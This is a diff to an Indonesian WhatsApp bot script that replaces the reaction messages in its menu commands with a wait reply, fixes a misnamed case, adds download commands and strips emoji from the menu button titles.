-            if (!m.isGroup) return m.reply('Fitur ini hanya dapat digunakan di grup.', {
+            if (!m.isGroup) return Replyx('Fitur ini hanya dapat digunakan di grup.', {
                     quoted: fkontak1
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -9982,21 +9951,10 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
             }
             break
             case 'searchmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                    Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -10036,21 +9994,10 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
             }
             break
             case 'downloadmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -10059,6 +10006,9 @@ break;
 │ ${setv} ${prefix}ytmp4 (url)
 │ ${setv} ${prefix}instagram (url)
 │ ${setv} ${prefix}tiktok (url)
+│ ${setv} ${prefix}ttmp4 (url)
+│ ${setv} ${prefix}igdown (url)
+│ ${setv} ${prefix}igstory (url)
 │ ${setv} ${prefix}facebook (url)
 │ ${setv} ${prefix}spotifydl (url)
 │ ${setv} ${prefix}mediafire (url)
@@ -10083,21 +10033,10 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
             }
             break
             case 'quotesmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10128,21 +10067,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
-            case 'libraymenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+            case 'librarymenu': {
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10215,21 +10144,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'toolsmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10295,21 +10214,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'aimenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10337,22 +10246,11 @@ break;
                     buttons: buttons
                 }, {
                     quoted: ftroli
-                })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                })               
             }
             break
             case 'animemenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10460,21 +10358,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
             }
             break
             case 'gamemenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -10517,21 +10405,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'funmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -10573,21 +10451,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'randommenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍  
@@ -10620,23 +10488,13 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
 
             break
             case 'pushmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -10670,21 +10528,11 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'ownermenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
@@ -10738,12 +10586,7 @@ break;
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
 
@@ -10797,12 +10640,12 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
             buttons: [
                 {
                     buttonId: ".owner",
-                    buttonText: { displayText: "👤 Owner" },
+                    buttonText: { displayText: "Owner" },
                     type: 1,
                 },
                 {
                     buttonId: ".sewa",
-                    buttonText: { displayText: "🛍️ Sewa" },
+                    buttonText: { displayText: "Sewa" },
                     type: 1,
                 },
                 {
@@ -10820,7 +10663,7 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
                                     rows: [
                                         {
                                             id: ".allmenu",
-                                            title: "📚 All Menu",
+                                            title: " All Menu",
                                             description: "Menampilkan Semua Menu"
                                         }
                                     ]
@@ -10828,21 +10671,21 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
                                 {
                                     title: "List Menu Yang Terpisah",
                                     rows: [
-                                        { id: ".botmenu", title: "🧾 Bot Menu", description: "Menampilkan Menu Bot" },
-                                        { id: ".groupmenu", title: "👥 Group Menu", description: "Menampilkan Menu Group" },
-                                        { id: ".searchmenu", title: "🔍 Search Menu", description: "Menampilkan Menu Pencarian" },
-                                        { id: ".downloadmenu", title: "📥 Download Menu", description: "Menampilkan Menu Download" },
-                                        { id: ".pushmenu", title: "🚀 Push Menu", description: "Menampilkan Menu Push" },
-                                        { id: ".quotesmenu", title: "🔖 Quotes Menu", description: "Menampilkan Menu Quotes" },
-                                        { id: ".librarymenu", title: "📖 Library Menu", description: "Menampilkan Menu Library" },
-                                        { id: ".toolsmenu", title: "🛠️ Tools Menu", description: "Menampilkan Menu Alat" },
-                                        { id: ".aimenu", title: "🧠 AI Menu", description: "Menampilkan Menu AI" },
-                                        { id: ".gamemenu", title: "🎮 Game Menu", description: "Menampilkan Menu Game" },
-                                        { id: ".funmenu", title: "🎉 Fun Menu", description: "Menampilkan Menu Hiburan" },
-                                        { id: ".animemenu", title: "📺 Anime Menu", description: "Menampilkan Menu Anime" },
-                                        { id: ".musicmenu", title: "🎧 Music Menu", description: "Menampilkan Menu Audio" },
-                                        { id: ".randommenu", title: "🌟 Random Menu", description: "Menampilkan Menu Acak" },
-                                        { id: ".ownermenu", title: "👑 Owner Menu", description: "Menampilkan Menu Owner" }
+                                        { id: ".botmenu", title: " Bot Menu", description: "Menampilkan Menu Bot" },
+                                        { id: ".groupmenu", title: " Group Menu", description: "Menampilkan Menu Group" },
+                                        { id: ".searchmenu", title: " Search Menu", description: "Menampilkan Menu Pencarian" },
+                                        { id: ".downloadmenu", title: " Download Menu", description: "Menampilkan Menu Download" },
+                                        { id: ".pushmenu", title: " Push Menu", description: "Menampilkan Menu Push" },
+                                        { id: ".quotesmenu", title: " Quotes Menu", description: "Menampilkan Menu Quotes" },
+                                        { id: ".librarymenu", title: " Library Menu", description: "Menampilkan Menu Library" },
+                                        { id: ".toolsmenu", title: " Tools Menu", description: "Menampilkan Menu Alat" },
+                                        { id: ".aimenu", title: " AI Menu", description: "Menampilkan Menu AI" },
+                                        { id: ".gamemenu", title: " Game Menu", description: "Menampilkan Menu Game" },
+                                        { id: ".funmenu", title: " Fun Menu", description: "Menampilkan Menu Hiburan" },
+                                        { id: ".animemenu", title: " Anime Menu", description: "Menampilkan Menu Anime" },
+                                        { id: ".musicmenu", title: " Music Menu", description: "Menampilkan Menu Audio" },
+                                        { id: ".randommenu", title: " Random Menu", description: "Menampilkan Menu Acak" },
+                                        { id: ".ownermenu", title: " Owner Menu", description: "Menampilkan Menu Owner" }
                                     ]
                                 },
                                 {
@@ -10851,7 +10694,7 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
                                     rows: [
                                         {
                                             id: ".xlesybug",
-                                            title: "⚡ BUG XLESYVIP",
+                                            title: "🎀 BUG XLESYVIP",
                                             description: "Menampilkan Menu BUG XlesyVIP"
                                         }
                                     ]
@@ -10859,8 +10702,8 @@ Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anyt
                                 {
                                     title: "Documentasi Bot",
                                     rows: [
-                                        { id: ".script", title: "📁 Script", description: "Menampilkan Information Script" },
-                                        { id: ".infobot", title: "🗒️ Information Bot", description: "Menampilkan Information Bot" }
+                                        { id: ".script", title: " Script", description: "Menampilkan Information Script" },
+                                        { id: ".infobot", title: " Information Bot", description: "Menampilkan Information Bot" }
                                     ]
                                 }
                             ]
